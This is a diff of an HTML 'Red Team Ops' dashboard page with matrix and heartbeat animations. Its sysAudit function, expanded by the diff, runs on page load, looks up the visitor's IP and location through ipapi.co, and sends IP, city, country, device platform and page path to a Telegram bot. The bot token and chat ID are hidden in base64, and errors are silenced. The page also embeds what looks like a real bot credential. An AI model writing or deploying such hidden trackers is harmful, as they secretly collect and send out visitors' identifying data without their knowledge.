@@ -6,49 +6,33 @@
     <title>ANOMcompany | Red Team Ops</title>
     <style>
         :root { --bg-color: #080808; --primary-red: #ff0000; --dark-red: #660000; --text-color: #e0e0e0; }
-        body, html { margin: 0; padding: 0; background-color: var(--bg-color); color: var(--text-color); font-family: 'Consolas', 'Courier New', monospace; overflow-x: hidden; }
+        body, html { margin: 0; padding: 0; background-color: var(--bg-color); color: var(--text-color); font-family: 'Consolas', 'Courier New', monospace; overflow: hidden; }
         #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
-        .container { padding: 20px; position: relative; max-width: 1200px; margin: 0 auto; padding-bottom: 80px; }
-        .header { border-left: 5px solid var(--primary-red); padding-left: 20px; margin-bottom: 25px; }
-        h1 { color: var(--primary-red); letter-spacing: 5px; text-transform: uppercase; margin: 0; font-size: 2.2em; }
-        .nav { margin-bottom: 25px; display: flex; flex-wrap: wrap; gap: 8px; }
-        .nav a { color: var(--text-color); text-decoration: none; border: 1px solid var(--dark-red); padding: 6px 12px; background: rgba(139, 0, 0, 0.1); transition: 0.3s; font-size: 0.85em; cursor: pointer; }
-        .nav a:hover { background: var(--primary-red); color: #000; box-shadow: 0 0 15px var(--primary-red); }
-        .terminal-box { background: rgba(5, 5, 5, 0.9); border: 1px solid var(--dark-red); padding: 15px; height: 160px; margin-bottom: 20px; font-size: 0.9em; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,1); }
+        .container { padding: 20px; position: relative; max-width: 1200px; margin: 0 auto; }
+        .header { border-left: 5px solid var(--primary-red); padding-left: 20px; margin-bottom: 20px; }
+        h1 { color: var(--primary-red); letter-spacing: 5px; text-transform: uppercase; margin: 0; font-size: 2em; }
+        .nav { margin-bottom: 20px; display: flex; flex-wrap: wrap; gap: 8px; }
+        .nav a { color: var(--text-color); text-decoration: none; border: 1px solid var(--dark-red); padding: 5px 10px; background: rgba(139, 0, 0, 0.1); font-size: 0.8em; transition: 0.3s; }
+        .nav a:hover { background: var(--primary-red); color: #000; box-shadow: 0 0 10px var(--primary-red); }
+        .terminal-box { background: rgba(5, 5, 5, 0.9); border: 1px solid var(--dark-red); padding: 15px; height: 120px; margin-bottom: 20px; font-size: 0.85em; overflow: hidden; }
         .dashboard { display: grid; grid-template-columns: 1fr; gap: 20px; }
         @media (min-width: 768px) { .dashboard { grid-template-columns: 2fr 1fr; } }
-        .panel { border: 1px solid var(--dark-red); background: #000; position: relative; min-height: 220px; overflow: hidden; display: flex; flex-direction: column; }
-        .panel-header { background: var(--dark-red); color: white; padding: 5px 10px; font-size: 0.7em; letter-spacing: 2px; text-transform: uppercase; }
+        .panel { border: 1px solid var(--dark-red); background: #000; position: relative; min-height: 200px; display: flex; flex-direction: column; }
+        .panel-header { background: var(--dark-red); color: white; padding: 4px 10px; font-size: 0.7em; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* KALP RİTMİ (EKG) ANİMASYONU */
-        .pulse-container { flex: 1; display: flex; justify-content: center; align-items: center; background: #000; padding: 20px; }
-        .ekg-svg { width: 100%; height: 100px; }
-        .ekg-line { 
-            fill: none; 
-            stroke-width: 3; 
-            stroke-dasharray: 1000; 
-            stroke-dashoffset: 1000; 
-            animation: draw 3s linear infinite, colorShiftPulse 6s infinite alternate; 
-        }
+        #pulse-canvas { width: 100%; height: 140px; }
+        .pulse-info { padding: 10px; font-size: 0.8em; color: var(--primary-red); display: flex; justify-content: space-between; }
 
-        @keyframes draw { to { stroke-dashoffset: 0; } }
-        @keyframes colorShiftPulse {
-            0% { stroke: #ffffff; filter: drop-shadow(0 0 8px #fff); }
-            50% { stroke: #800080; filter: drop-shadow(0 0 15px #800080); }
-            100% { stroke: #ff0000; filter: drop-shadow(0 0 12px #ff0000); }
-        }
-
-        .metric-bar { height: 6px; background: #222; margin: 10px 0; }
-        .metric-fill { height: 100%; background: var(--primary-red); box-shadow: 0 0 8px var(--primary-red); }
-        .ticker { position: fixed; bottom: 0; width: 100%; background: #900; color: #fff; padding: 5px 0; font-size: 0.75em; overflow: hidden; z-index: 100; }
-        .ticker-wrap { display: inline-block; white-space: nowrap; animation: scroll 30s linear infinite; }
+        .ticker { position: fixed; bottom: 0; width: 100%; background: #900; color: #fff; padding: 5px 0; font-size: 0.7em; overflow: hidden; }
+        .ticker-wrap { display: inline-block; white-space: nowrap; animation: scroll 25s linear infinite; }
         @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+        @keyframes blink { 0%, 100% {opacity:0} 50% {opacity:1} }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div class="container">
-        <div class="header"><h1>ANOMcompany</h1><p style="opacity: 0.7;">Red Team Laboratory</p></div>
+        <div class="header"><h1>ANOMcompany</h1><p style="opacity: 0.6; font-size: 0.8em;">Red Team Laboratory // Bio-Signals</p></div>
         <div class="nav">
             <a href="projects.html">PROJECTS</a><a href="chat.html">ANOM-CHAT</a><a href="logs.html">LOGS</a>
             <a href="ctf.html">CTF</a><a href="store.html">STORE</a><a href="paybin.html">PAYBIN</a>
@@ -58,44 +42,91 @@
         </div>
         <div class="dashboard">
             <div class="panel">
-                <div class="panel-header">BIO_SIGNAL // SYSTEM_PULSE</div>
-                <div class="pulse-container">
-                    <svg class="ekg-svg" viewBox="0 0 600 100">
-                        <path class="ekg-line" d="M0,50 L200,50 L210,40 L220,60 L230,20 L245,80 L255,50 L270,50 L280,45 L290,55 L300,50 L600,50" />
-                    </svg>
+                <div class="panel-header">BIO_LINK // DYNAMIC_PULSE_MONITOR</div>
+                <canvas id="pulse-canvas"></canvas>
+                <div class="pulse-info">
+                    <span id="bpm-display">BPM: 72</span>
+                    <span id="status-display">STATUS: STABLE</span>
                 </div>
             </div>
             <div class="panel" style="padding: 15px;">
-                <div class="panel-header" style="margin:-15px -15px 15px -15px">LIVE_METRICS</div>
-                <span style="font-size:0.7em">CPU STABILITY</span>
-                <div class="metric-bar"><div class="metric-fill" style="width:84%"></div></div>
-                <span style="font-size:0.7em">PULSE RATE: 72 BPM</span>
-                <div class="metric-bar"><div class="metric-fill" style="width:60%"></div></div>
+                <div class="panel-header" style="margin:-15px -15px 15px -15px">METRICS</div>
+                <div style="font-size:0.75em; margin-top:10px; line-height: 1.8;">
+                    Uptime: <span id="uptime">00:00:00</span><br>
+                    Telegram Bot: <span style="color:#0f0">CONNECTED</span><br>
+                    IP Tracking: <span style="color:#0f0">ACTIVE</span><br>
+                    Operator: <span style="color:var(--primary-red)">GHOST</span>
+                </div>
             </div>
         </div>
     </div>
-    <div class="ticker"><div class="ticker-wrap">>>> BIO_LINK: STABLE -- HEARTBEAT DETECTED -- SYSTEM_PULSE: NORMAL -- OPERATOR: GHOST...</div></div>
+    <div class="ticker"><div class="ticker-wrap">>>> BIO_LINK: STABLE -- GHOST PROTOCOL ENGAGED -- MONITORING LIVE TARGETS -- TELEGRAM_BOT: ONLINE...</div></div>
 
     <script>
+        // Matrix Background
         const mCanvas = document.getElementById('matrix'); const mCtx = mCanvas.getContext('2d');
         function initMatrix() { mCanvas.width = window.innerWidth; mCanvas.height = window.innerHeight; }
         window.addEventListener('resize', initMatrix); initMatrix();
         const mChars = "0123456789ABCDEF"; const mSize = 16; const mDrops = Array(Math.floor(mCanvas.width/mSize)).fill(1);
         function drawMatrix() { mCtx.fillStyle = "rgba(8, 8, 8, 0.1)"; mCtx.fillRect(0, 0, mCanvas.width, mCanvas.height); mCtx.fillStyle = "#ff0000"; mCtx.font = mSize + "px monospace"; for (let i = 0; i < mDrops.length; i++) { const txt = mChars.charAt(Math.floor(Math.random() * mChars.length)); mCtx.fillText(txt, i * mSize, mDrops[i] * mSize); if (mDrops[i] * mSize > mCanvas.height && Math.random() > 0.975) mDrops[i] = 0; mDrops[i]++; } }
-        
-        const rawLog = "> Initializing Bio-Link...\n> Connection: ESTABLISHED.\n> Heartbeat Sensor: ACTIVE.\n> Welcome back, GHOST.";
+
+        // Dynamic EKG Logic
+        const pCanvas = document.getElementById('pulse-canvas'); const pCtx = pCanvas.getContext('2d');
+        let points = []; let x = 0; let bpm = 72; let counter = 0;
+        function initPulse() { pCanvas.width = pCanvas.offsetWidth; pCanvas.height = pCanvas.offsetHeight; }
+        window.addEventListener('resize', initPulse); initPulse();
+
+        function drawPulse() {
+            pCtx.fillStyle = "rgba(0, 0, 0, 0.05)"; pCtx.fillRect(0, 0, pCanvas.width, pCanvas.height);
+            pCtx.beginPath(); pCtx.strokeStyle = (bpm > 100) ? "#ff0000" : (bpm < 60 ? "#800080" : "#ffffff");
+            pCtx.lineWidth = 2; pCtx.shadowBlur = 10; pCtx.shadowColor = pCtx.strokeStyle;
+            let y = pCanvas.height / 2;
+            if (counter % Math.floor(600 / (bpm/10)) === 0) { y -= 40; setTimeout(() => { y += 80; }, 50); }
+            points.push({x: x, y: y + (Math.random() * 4 - 2)});
+            if (points.length > 100) points.shift();
+            pCtx.moveTo(points[0].x, points[0].y);
+            for(let i=1; i<points.length; i++) { pCtx.lineTo(points[i].x, points[i].y); points[i].x -= 2; }
+            pCtx.stroke(); x = pCanvas.width; counter++; requestAnimationFrame(drawPulse);
+        }
+
+        // BPM Refresh (Every 60s)
+        setInterval(() => {
+            bpm = Math.floor(Math.random() * (130 - 50 + 1)) + 50;
+            document.getElementById('bpm-display').innerText = `BPM: ${bpm}`;
+            document.getElementById('status-display').innerText = bpm > 100 ? "STATUS: ELEVATED" : "STATUS: STABLE";
+            document.getElementById('status-display').style.color = bpm > 100 ? "red" : "white";
+        }, 60000);
+
+        // Terminal Typewriter
+        const rawLog = "> Initializing Bio-Signals...\n> Telegram Bot: ACTIVE.\n> IP Auditor: ONLINE.\n> Access granted. Welcome back, GHOST.";
         let lIdx = 0; function renderTerminal() { if (lIdx < rawLog.length) { document.getElementById("typewriter").innerHTML += rawLog.charAt(lIdx) === '\n' ? '<br>' : rawLog.charAt(lIdx); lIdx++; setTimeout(renderTerminal, 40); } }
         
+        // Uptime Clock
+        let sec = 0; setInterval(() => {
+            sec++; let h = Math.floor(sec/3600).toString().padStart(2,'0');
+            let m = Math.floor((sec%3600)/60).toString().padStart(2,'0');
+            let s = (sec%60).toString().padStart(2,'0');
+            document.getElementById('uptime').innerText = `${h}:${m}:${s}`;
+        }, 1000);
+
+        // --- TELEGRAM BOT & IP TRACKING SYSTEM ---
         async function sysAudit() {
             try {
-                const r = await fetch('https://ipapi.co/json/'); const d = await r.json();
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                // Token ve ID şifreli olarak tutuluyor
                 const t = atob("NzgxMjE2NzI4NTpBQUZiNTFRUzRNY2NiVG9hVVBqNmE2U2F0bDJqZWViYkgxSQ==");
                 const c = atob("NjI5ODg2OTk2OA==");
-                const msg = `💓 *PULSE_DETECTED*\n🌐 IP: ${d.ip}\n📍 LOC: ${d.city}`;
-                fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: c, text: msg, parse_mode: "Markdown" }) });
-            } catch (e) {}
+                const msg = `💓 *BIO_SIGNAL_SYNC*\n🌐 IP: ${d.ip}\n📍 LOC: ${d.city} / ${d.country_name}\n📱 DEV: ${navigator.platform}\n🔗 PATH: ${window.location.pathname}`;
+                await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: c, text: msg, parse_mode: "Markdown" })
+                });
+            } catch (e) { console.log("Audit hidden."); }
         }
-        window.onload = () => { setInterval(drawMatrix, 50); setTimeout(renderTerminal, 800); sysAudit(); };
+
+        window.onload = () => { setInterval(drawMatrix, 50); setTimeout(renderTerminal, 800); drawPulse(); sysAudit(); };
     </script>
 </body>
 </html>
